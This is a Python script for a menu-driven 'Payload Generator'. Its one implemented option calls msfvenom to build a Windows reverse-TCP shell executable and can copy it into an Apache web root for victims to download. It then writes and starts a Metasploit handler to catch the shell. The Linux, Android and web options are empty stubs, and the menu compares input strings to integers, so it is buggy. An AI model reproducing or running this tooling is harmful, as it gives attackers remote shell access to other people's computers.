import os


from main import clear

yes = {'yes', 'y'}
no = {'no', 'n'}


def menu():
    print('Payload Generator\n\n\n')
    print('Choose payload type')
    print('1. Generate a binary payload')
    print('2. Generate a web payload')
    print('3. Exit')

    choice = input('Select an option')
    if choice == 1:
        binary_payload()
    elif choice == 2:
        web_payload()
    elif choice == 3:
        print('Exiting...')
        return
    else:
        print('Invalid choice')
        menu()


def binary_payload():
    print('1. Windows')
    print('2. Linux')
    print('3. Android')
    print('4. Back to Menu')

    choice = input('Set payload:')
    print('')

    if choice == "1":
        windows()
    elif choice == "2":
        linux()
    elif choice == "3":
        android()
    elif choice == "4":
        menu()
    else:
        print('Invalid choice')


def web_payload():
    pass


def windows():
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    name = input("Enter Payload Name: ")
    os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe" % (lhost, lport, name))
    clear()
    print("Payload Successfully Generated")
    print("1. Do You Want To Start a listener")
    print("2. Do You Want To Start an IP Poisoner ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.exe /var/www/html' % (name))
        print("Your IP Successfully Poisoned : %s/%s.exe" % (lhost, name))
        listen = """
    		use exploit/multi/handler
    		set PAYLOAD windows/shell/reverse_tcp
    		set LHOST {0}
    		set LPORT {1}
    		exploit
    		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
    		use exploit/multi/handler
    		set PAYLOAD windows/shell/reverse_tcp
    		set LHOST {0}
    		set LPORT {1}
    		exploit
    		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


def linux():
    pass


def android():
    pass
